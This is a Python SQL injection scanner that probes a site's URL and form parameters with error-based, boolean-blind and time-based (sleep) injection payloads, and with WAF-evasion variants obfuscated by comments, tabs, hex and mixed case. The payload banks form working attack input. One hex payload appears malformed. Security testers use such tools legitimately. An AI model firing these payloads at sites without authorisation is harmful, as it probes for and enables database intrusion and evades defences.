"""
SQL Injection Scanner — Full Rewrite
=====================================
Detection methods:
  1. Error-based      — DB error strings in response
  2. Boolean blind    — Compares TRUE vs FALSE condition responses (length + hash diff)
  3. Time-based       — Statistical baseline; requires MEDIAN delay >> baseline
  4. WAF-evasion      — Encoded / case-mixed variants of blocked payloads

Key improvements over v1:
  - Boolean-blind: no reliance on error messages or timing
  - Time-based: takes a 3-request baseline median BEFORE injecting;
    only flags if injected response is >= baseline + SLEEP_SECONDS - 1.0s
    (eliminates false positives from slow endpoints / network jitter)
  - WAF evasion: hex encoding, comment obfuscation, case randomisation
  - Per-parameter short-circuit: once a vuln is confirmed, skip remaining methods
  - All findings include method, payload, evidence, and confidence score
"""
from __future__ import annotations

import re
import statistics
import time
from typing import Any, Dict, List, Optional, Tuple

import requests


# ---------------------------------------------------------------------------
# Payload banks
# ---------------------------------------------------------------------------

# Error-based — minimal, avoid WAF keyword triggers
ERROR_PAYLOADS: List[Tuple[str, str]] = [
    ("'", "single_quote"),
    ("''", "double_quote"),
    ("\\", "backslash"),
    ("1 AND 1=CONVERT(int,@@version)--", "mssql_convert"),
    ("1 AND extractvalue(1,concat(0x7e,version()))--", "mysql_extractvalue"),
    ("1 AND 1=cast(version() as int)--", "pg_cast"),
]

# Boolean-blind — pairs of (true_payload, false_payload)
# True condition should return normal page; False should return different content
BOOLEAN_PAIRS: List[Tuple[str, str, str]] = [
    # (label, true_suffix, false_suffix)
    ("AND 1=1 vs 1=2",        "' AND '1'='1",          "' AND '1'='2"),
    ("AND true vs false",     "' AND true--",           "' AND false--"),
    ("OR 1=1 vs 1=2 (num)",   " OR 1=1--",              " OR 1=2--"),
    ("CASE true vs false",    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
                               "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--"),
]

# Time-based — database-specific SLEEP / WAITFOR / pg_sleep
# SLEEP_SECONDS intentionally long enough to beat jitter
SLEEP_SECONDS = 6
TIME_PAYLOADS: List[Tuple[str, str]] = [
    (f"' OR SLEEP({SLEEP_SECONDS})--",                          "mysql"),
    (f"'; WAITFOR DELAY '00:00:0{SLEEP_SECONDS}'--",            "mssql"),
    (f"' OR pg_sleep({SLEEP_SECONDS})--",                       "postgres"),
    (f"' AND BENCHMARK({SLEEP_SECONDS * 1_000_000},MD5('x'))--", "mysql_bench"),
    (f"' OR RANDOMBLOB({SLEEP_SECONDS * 50_000_000})--",        "sqlite"),
]

# WAF-evasion variants (hex / comment / case obfuscation)
WAF_EVASION_PAYLOADS: List[Tuple[str, str]] = [
    ("'/**/OR/**/1=1--",                          "comment_or"),
    ("'%09OR%091=1--",                            "tab_or"),
    ("' /*!OR*/ 1=1--",                           "inline_comment_or"),
    ("0x27204f5220 31 3d 31 2d 2d",               "hex_or"),          # hex for ' OR 1=1--
    ("' OR 0x313d31--",                           "hex_compare"),
    ("';sElEcT sLeEp(5)--",                       "case_sleep"),
    ("' UniOn SeLeCt NuLl--",                     "case_union"),
    ("' OR 'unusual'='unusual",                   "string_compare"),
]

# DB error patterns (case-insensitive)
ERROR_PATTERNS: List[str] = [
    r"SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|MySQLSyntaxError",
    r"PostgreSQL.*ERROR|Warning.*pg_|PSQLException",
    r"Driver.*SQL[\s_]Server|OLE DB.*SQL|ODBC.*SQL|SqlException",
    r"ORA-\d{4,}|Oracle.*Driver|oracle\.jdbc",
    r"SQLiteException|sqlite3\.OperationalError|unrecognized token",
    r"Microsoft.*Database.*Engine|Jet Database",
    r"System\.Data\.SqlClient|SqlCommand|SqlDataReader",
    r"SQLSTATE\[\w+\]|PDOException",
    r"DB2 SQL error|SQLCODE",
    r"Sybase.*message|com\.sybase",
]


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def _fingerprint(text: str) -> Tuple[int, str]:
    """Return (length, first-500-chars) as a cheap content fingerprint."""
    return len(text), text[:500]


def _responses_differ(fp1: Tuple[int, str], fp2: Tuple[int, str],
                       len_threshold: int = 50) -> bool:
    """True if the two response fingerprints are meaningfully different."""
    len1, snip1 = fp1
    len2, snip2 = fp2
    if abs(len1 - len2) >= len_threshold:
        return True
    if snip1 != snip2:
        return True
    return False


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class SQLiScanner:
    """
    Multi-method SQL injection scanner.

    Detection order per parameter (short-circuits on first confirmed hit):
      1. Error-based
      2. Boolean-blind
      3. Time-based (with statistical baseline)
      4. WAF-evasion (error-based variants)
    """

    def __init__(self, timeout: int = 10,
                 session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()
        if not session:
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for param in params:
            result = self._scan_param(url, param, str(params[param]), params, "GET")
            if result:
                findings.append(result)
        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        action  = form_data.get("action")
        method  = (form_data.get("method") or "GET").upper()
        inputs  = form_data.get("inputs", [])
        if not action or not inputs:
            return findings

        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
        for param in baseline:
            result = self._scan_param(action, param, "", baseline, method)
            if result:
                findings.append(result)
        return findings

    # ------------------------------------------------------------------
    # Per-parameter orchestration
    # ------------------------------------------------------------------

    def _scan_param(self, url: str, param: str, original: str,
                    all_params: Dict[str, Any], method: str) -> Optional[Dict]:
        """Try each detection method in order; return first confirmed finding."""

        print(f"  [SQLi] Testing '{param}' on {url}")

        # Fetch a clean baseline response for boolean/time comparisons
        baseline_resp = self._fetch(url, all_params, method)
        baseline_fp   = _fingerprint(baseline_resp) if baseline_resp else (0, "")

        # 1. Error-based
        result = self._error_based(url, param, original, all_params, method)
        if result:
            return result

        # 2. Boolean-blind
        result = self._boolean_blind(url, param, original, all_params,
                                     method, baseline_fp)
        if result:
            return result

        # 3. Time-based (statistical)
        result = self._time_based(url, param, original, all_params, method)
        if result:
            return result

        # 4. WAF-evasion error-based
        result = self._waf_evasion(url, param, original, all_params, method)
        if result:
            return result

        return None

    # ------------------------------------------------------------------
    # Detection method 1: Error-based
    # ------------------------------------------------------------------

    def _error_based(self, url: str, param: str, original: str,
                     params: Dict[str, Any], method: str) -> Optional[Dict]:
        for payload, label in ERROR_PAYLOADS:
            injected = original + payload
            text = self._fetch(url, {**params, param: injected}, method)
            if text is None:
                continue
            match = self._find_db_error(text)
            if match:
                print(f"    [!] Error-based SQLi on '{param}' ({label})")
                return self._finding("error-based", param, payload,
                                     f"DB error matched: {match}", 95)
        return None

    # ------------------------------------------------------------------
    # Detection method 2: Boolean-blind
    # ------------------------------------------------------------------

    def _boolean_blind(self, url: str, param: str, original: str,
                        params: Dict[str, Any], method: str,
                        baseline_fp: Tuple[int, str]) -> Optional[Dict]:
        """
        For each TRUE/FALSE payload pair:
          - TRUE response should look like baseline (same length ± 50 chars)
          - FALSE response should differ from TRUE response
        Only flag if BOTH conditions hold — avoids false positives.
        """
        for label, true_sfx, false_sfx in BOOLEAN_PAIRS:
            true_text  = self._fetch(url, {**params, param: original + true_sfx},  method)
            false_text = self._fetch(url, {**params, param: original + false_sfx}, method)

            if true_text is None or false_text is None:
                continue

            true_fp  = _fingerprint(true_text)
            false_fp = _fingerprint(false_text)

            true_matches_baseline  = not _responses_differ(true_fp,  baseline_fp)
            true_differs_from_false = _responses_differ(true_fp, false_fp)

            if true_matches_baseline and true_differs_from_false:
                print(f"    [!] Boolean-blind SQLi on '{param}' ({label})")
                evidence = (
                    f"TRUE response len={true_fp[0]}, "
                    f"FALSE response len={false_fp[0]}, "
                    f"baseline len={baseline_fp[0]}"
                )
                return self._finding("boolean-blind", param,
                                     f"TRUE: {true_sfx} | FALSE: {false_sfx}",
                                     evidence, 85)
        return None

    # ------------------------------------------------------------------
    # Detection method 3: Time-based (statistical baseline)
    # ------------------------------------------------------------------

    def _time_based(self, url: str, param: str, original: str,
                    params: Dict[str, Any], method: str) -> Optional[Dict]:
        """
        1. Measure 3 baseline requests to the unmodified param.
        2. Compute median baseline latency.
        3. Inject SLEEP payload — only flag if elapsed >= median + SLEEP_SECONDS - 1.0
           This tolerates up to 1 second of network jitter.
        """
        # --- Baseline measurement ---
        baseline_times: List[float] = []
        for _ in range(3):
            t0 = time.monotonic()
            self._fetch(url, params, method)
            baseline_times.append(time.monotonic() - t0)

        median_baseline = statistics.median(baseline_times)
        threshold = median_baseline + SLEEP_SECONDS - 1.0  # 1s jitter tolerance

        print(f"    [SQLi-time] baseline median={median_baseline:.2f}s, "
              f"threshold={threshold:.2f}s for '{param}'")

        # --- Injection ---
        for payload, db_label in TIME_PAYLOADS:
            injected = original + payload
            t0 = time.monotonic()
            self._fetch(url, {**params, param: injected}, method,
                        timeout=self.timeout + SLEEP_SECONDS + 3)
            elapsed = time.monotonic() - t0

            if elapsed >= threshold:
                print(f"    [!] Time-based SQLi on '{param}' ({db_label}) "
                      f"elapsed={elapsed:.2f}s vs threshold={threshold:.2f}s")
                return self._finding(
                    "time-based", param, payload,
                    f"elapsed={elapsed:.2f}s, baseline_median={median_baseline:.2f}s, "
                    f"threshold={threshold:.2f}s, db_hint={db_label}",
                    80,
                )
        return None

    # ------------------------------------------------------------------
    # Detection method 4: WAF evasion
    # ------------------------------------------------------------------

    def _waf_evasion(self, url: str, param: str, original: str,
                     params: Dict[str, Any], method: str) -> Optional[Dict]:
        for payload, label in WAF_EVASION_PAYLOADS:
            injected = original + payload
            text = self._fetch(url, {**params, param: injected}, method)
            if text is None:
                continue
            match = self._find_db_error(text)
            if match:
                print(f"    [!] WAF-evading SQLi on '{param}' ({label})")
                return self._finding("error-based (waf-evasion)", param, payload,
                                     f"DB error matched: {match}", 88)
        return None

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _fetch(self, url: str, params: Dict[str, Any], method: str,
               timeout: Optional[int] = None) -> Optional[str]:
        """Send a request and return the response text, or None on failure."""
        t = timeout or self.timeout
        try:
            if method.upper() == "GET":
                r = self.session.get(url,  params=params, timeout=t)
            else:
                r = self.session.post(url, data=params,   timeout=t)
            return r.text
        except requests.RequestException as exc:
            print(f"    [err] Request failed: {exc}")
            return None

    def _find_db_error(self, text: str) -> Optional[str]:
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return pattern
        return None

    @staticmethod
    def _finding(method: str, param: str, payload: str,
                 evidence: str, confidence: int) -> Dict[str, Any]:
        return {
            "vulnerable": True,
            "type":       "sqli",
            "method":     method,
            "param":      param,
            "payload":    payload,
            "evidence":   evidence,
            "confidence": confidence,
        }